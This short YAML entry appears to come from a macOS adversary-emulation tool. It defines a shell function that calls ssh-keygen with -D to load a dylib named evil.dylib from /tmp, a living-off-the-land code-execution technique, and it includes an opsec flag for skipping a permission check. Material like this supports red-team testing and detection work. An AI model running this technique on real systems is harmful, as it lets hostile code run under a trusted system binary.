    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
        exit_on_failure: true
    code: "execute_execute_malicious_dynamic_library_dylib_from_standard_input() {\n    local result\n    result=$(ssh-keygen\
      \ -D /private/tmp/evil.dylib 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
